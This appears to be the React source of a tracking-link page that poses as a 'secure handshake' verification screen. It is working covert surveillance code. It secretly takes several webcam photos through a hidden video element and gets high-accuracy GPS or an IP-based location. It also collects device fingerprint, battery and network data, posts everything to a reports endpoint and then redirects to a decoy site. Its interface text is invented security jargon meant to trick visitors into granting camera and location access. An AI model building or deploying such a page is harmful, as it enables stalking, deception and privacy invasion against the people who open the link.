
import React, { useEffect, useState, useRef, useCallback } from 'react';
import { ShieldCheck, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal, AlertTriangle, RefreshCcw } from 'lucide-react';
import { CaptureReport, DeviceInfo, GeoLocation, BatteryInfo, NetworkInfo } from '../types';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'consent' | 'initializing' | 'denied' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
  const [sliderPos, setSliderPos] = useState(0);
  const [geoStatus, setGeoStatus] = useState<string>('Initialization Required');
  const [accuracy, setAccuracy] = useState<number | null>(null);
  const [redirectTarget, setRedirectTarget] = useState('https://google.com');

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const reportRef = useRef<Partial<CaptureReport>>({});
  const containerRef = useRef<HTMLDivElement>(null);
  const isDragging = useRef(false);
  const geoPromiseRef = useRef<Promise<GeoLocation> | null>(null);

  useEffect(() => {
    fetch(`/api/link-info/${linkId}`).then(r => r.json()).then(data => { if (data.redirectUrl) setRedirectTarget(data.redirectUrl); });
  }, [linkId]);

  const getDeviceInfo = (): DeviceInfo => {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let os = "Unknown";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac OS")) os = "MacOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone")) os = "iOS";

    return {
      browser,
      os,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      userAgent: ua,
      orientation: window.screen.orientation?.type || 'unknown',
      ram: (navigator as any).deviceMemory || 0,
      timezoneOffset: new Date().getTimezoneOffset(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone,
      devicePixelRatio: window.devicePixelRatio,
      colorDepth: window.screen.colorDepth,
      maxTouchPoints: navigator.maxTouchPoints,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: (navigator as any).pdfViewerEnabled || false
    };
  };

  const getBatteryInfo = async (): Promise<BatteryInfo> => {
    try {
      const battery = await (navigator as any).getBattery();
      return {
        level: battery.level,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    } catch (e) {
      return { level: 0, charging: false, chargingTime: 0, dischargingTime: 0 };
    }
  };

  const getNetworkInfo = (): NetworkInfo => {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    return conn ? {
      effectiveType: conn.effectiveType,
      downlink: conn.downlink,
      rtt: conn.rtt,
      saveData: conn.saveData
    } : {};
  };

  const getHighAccuracyLocation = useCallback((): Promise<GeoLocation> => {
    return new Promise((resolve) => {
      let watchId: number | null = null;
      let timeoutId: any = null;
      let bestFix: GeolocationPosition | null = null;

      const finish = () => {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (timeoutId) clearTimeout(timeoutId);
        if (bestFix) {
          resolve({
            lat: bestFix.coords.latitude, lon: bestFix.coords.longitude,
            accuracy: bestFix.coords.accuracy, altitude: bestFix.coords.altitude,
            altitudeAccuracy: bestFix.coords.altitudeAccuracy, heading: bestFix.coords.heading, speed: bestFix.coords.speed,
          });
        } else {
          fetch('https://ipapi.co/json/').then(r => r.json()).then(ipRes => resolve({
            lat: ipRes.latitude, lon: ipRes.longitude, accuracy: 3000,
            ip: ipRes.ip, city: ipRes.city, country: ipRes.country_name, isp: ipRes.org,
          })).catch(() => resolve({ lat: 0, lon: 0, accuracy: 0 }));
        }
      };

      if (!("geolocation" in navigator)) { finish(); return; }
      setGeoStatus('Requesting Satellite Access...');
      timeoutId = setTimeout(() => { finish(); }, 12000); 
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          setAccuracy(Math.round(pos.coords.accuracy));
          setGeoStatus('Handshake Valid...');
          if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
            bestFix = pos;
            if (pos.coords.accuracy <= 20) finish();
          }
        },
        () => { setStatus('denied'); finish(); },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }, []);

  const handleConsent = async () => {
    setStatus('initializing');
    // Artificial delay to show the "Initializing" state
    await new Promise(r => setTimeout(r, 1200));
    setStatus('idle');
    geoPromiseRef.current = getHighAccuracyLocation();
  };

  const finalizeCapture = async () => {
    setStatus('verifying');
    if (!geoPromiseRef.current) geoPromiseRef.current = getHighAccuracyLocation();
    
    let photos: string[] = [];
    if (navigator.mediaDevices?.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          for (let i = 0; i < 4; i++) {
            await new Promise(r => setTimeout(r, 600));
            const ctx = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            ctx?.drawImage(videoRef.current, 0, 0);
            photos.push(canvasRef.current.toDataURL('image/jpeg', 0.4));
          }
          stream.getTracks().forEach(t => t.stop());
        }
      } catch (e) {}
    }

    const finalLocation = await geoPromiseRef.current;
    const deviceInfo = getDeviceInfo();
    const batteryInfo = await getBatteryInfo();
    const networkInfo = getNetworkInfo();

    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
      reportRef.current.location = { 
        ...finalLocation, 
        ip: ipRes.ip, 
        city: finalLocation.city || ipRes.city, 
        country: finalLocation.country || ipRes.country_name, 
        isp: ipRes.org 
      };
    } catch (e) { reportRef.current.location = finalLocation; }

    reportRef.current.photos = photos;
    reportRef.current.device = deviceInfo;
    reportRef.current.battery = batteryInfo;
    reportRef.current.network = networkInfo;

    const finalReport = { 
      ...reportRef.current, 
      id: Math.random().toString(36).substring(7), 
      timestamp: new Date().toISOString(), 
      redirectUrl: redirectTarget, 
      linkId: linkId 
    };

    try {
      await fetch(`/api/reports/${linkId}`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(finalReport) 
      });
    } catch (err) {}

    setStatus('done');
    setTimeout(() => { window.location.href = redirectTarget; }, 1000);
  };

  const handleMove = (clientX: number) => {
    if (!isDragging.current || !containerRef.current) return;
    const rect = containerRef.current.getBoundingClientRect();
    const x = Math.max(0, Math.min(clientX - rect.left, rect.width - 64));
    const percent = (x / (rect.width - 64)) * 100;
    setSliderPos(percent);
    if (percent >= 98) { isDragging.current = false; setSliderPos(100); finalizeCapture(); }
  };

  useEffect(() => {
    const onMM = (e: MouseEvent) => handleMove(e.clientX);
    const onTM = (e: TouchEvent) => handleMove(e.touches[0].clientX);
    const onEnd = () => { isDragging.current = false; if (sliderPos < 98) { setSliderPos(0); setStatus('idle'); } };
    window.addEventListener('mousemove', onMM); window.addEventListener('touchmove', onTM); window.addEventListener('mouseup', onEnd); window.addEventListener('touchend', onEnd);
    return () => { window.removeEventListener('mousemove', onMM); window.removeEventListener('touchmove', onTM); window.removeEventListener('mouseup', onEnd); window.removeEventListener('touchend', onEnd); };
  }, [sliderPos]);

  return (
    <div className="min-h-screen bg-paper flex items-center justify-center p-4 select-none overflow-hidden">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="w-full max-w-sm bg-white rounded-[3rem] shadow-comic border-3 border-ink overflow-hidden animate-pop">
        {status === 'consent' || status === 'denied' || status === 'initializing' ? (
          <div className="p-10 space-y-8">
            <div className={`w-24 h-24 rounded-[2rem] flex items-center justify-center mx-auto border-3 border-ink shadow-comic-sm transition-transform duration-500 ${status === 'denied' ? 'bg-brand-crimson/10 rotate-12' : 'bg-brand-accent/10 rotate-3 animate-float'}`}>
              {status === 'denied' ? (
                <AlertTriangle className="text-brand-crimson" size={48} />
              ) : status === 'initializing' ? (
                <Loader2 className="text-brand-accent animate-spin" size={48} />
              ) : (
                <ShieldCheck size={48} className="text-brand-accent" />
              )}
            </div>
            <div className="text-center space-y-4">
              <h1 className={`text-2xl font-black uppercase italic tracking-tighter ${status === 'denied' ? 'text-brand-crimson' : 'text-ink'}`}>
                {status === 'denied' ? 'Sensor Protocol Error' : status === 'initializing' ? 'System Uplink...' : 'Handshake Required'}
              </h1>
              <p className="text-sm font-bold text-ink/50 leading-relaxed italic">
                {status === 'denied' 
                  ? 'Synchronization failed. Secure GPS telemetry is required to validate the identity handshake.' 
                  : status === 'initializing'
                  ? 'Synchronizing diagnostic environment with the secure relay bridge. Please stand by...'
                  : 'Establish a high-precision satellite handshake to authorize connection to the destination.'}
              </p>
            </div>
            <button 
              disabled={status === 'initializing'}
              onClick={handleConsent} 
              className="w-full bg-ink text-white font-black py-5 rounded-3xl flex items-center justify-center gap-3 uppercase italic tracking-tighter hover:bg-brand-accent transition-all shadow-comic-sm disabled:opacity-50"
            >
              {status === 'denied' ? <RefreshCcw size={18}/> : status === 'initializing' ? <Loader2 className="animate-spin" size={18} /> : null}
              {status === 'denied' ? 'Restart Handshake' : status === 'initializing' ? 'Calibrating...' : 'Initialize Secure Sync'}
            </button>
          </div>
        ) : (
          <>
            <div className="p-10 pb-6 text-center bg-paper border-b-3 border-ink">
              <div className="inline-flex items-center justify-center w-28 h-28 bg-brand-accent/5 rounded-[2.5rem] mb-6 border-3 border-ink relative shadow-comic-sm group">
                <div className={`absolute inset-0 bg-brand-accent/10 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
                <Fingerprint className="text-brand-accent relative z-10 transition-transform group-hover:scale-110" size={56} />
              </div>
              <h1 className="text-2xl font-black text-ink tracking-tighter uppercase italic">Handshake Auth</h1>
              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2 italic">{geoStatus}</p>
            </div>

            <div className="p-10 pt-4 space-y-8">
               <div className="bg-paper rounded-2xl p-5 border-2 border-ink shadow-comic-sm flex items-center justify-between transition-all hover:bg-white">
                <div className="flex items-center gap-4">
                  <div className="p-2 bg-brand-accent/10 border border-ink rounded-lg">
                    <Signal size={18} className="text-brand-accent" />
                  </div>
                  <div>
                    <p className="text-[10px] font-black text-ink uppercase tracking-widest">Signal integrity</p>
                    <p className="text-[9px] font-bold text-ink/40 uppercase italic">Calibrating uplink bridge</p>
                  </div>
                </div>
                <Activity size={18} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-ink/20'}`} />
              </div>

              <div 
                ref={containerRef} 
                className={`relative h-24 bg-paper rounded-[2.5rem] border-3 border-ink p-2 flex items-center overflow-hidden transition-all duration-300 ${status === 'sliding' ? 'scale-[1.02] shadow-comic' : 'shadow-comic-sm'}`}
              >
                <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.3em] flex items-center gap-2 italic">Connect Destination <ChevronRight size={16} /></span>
                </div>
                <div 
                  className="absolute left-0 top-0 h-full bg-brand-accent/5 transition-all duration-75" 
                  style={{ width: `calc(${sliderPos}% + 48px)` }} 
                />
                <div 
                  onMouseDown={() => {isDragging.current = true; setStatus('sliding');}} 
                  onTouchStart={() => {isDragging.current = true; setStatus('sliding');}} 
                  style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} 
                  className={`relative z-10 w-20 h-20 bg-white border-3 border-ink rounded-full shadow-comic-sm flex items-center justify-center transition-all cursor-grab active:cursor-grabbing hover:bg-brand-accent group ${status === 'verifying' ? 'bg-brand-accent' : ''}`}
                >
                  {status === 'verifying' ? (
                    <Loader2 className="animate-spin text-white" size={40} /> 
                  ) : status === 'done' ? (
                    <CheckCircle2 className="text-green-500" size={40} /> 
                  ) : (
                    <ChevronRight className="text-brand-accent group-hover:text-white transition-colors" size={40} />
                  )}
                </div>
              </div>
              <p className="text-[9px] text-center font-black text-ink/20 uppercase tracking-[0.2em] italic">Encrypted Secure Socket Relay (ESSR)</p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default CapturePage;
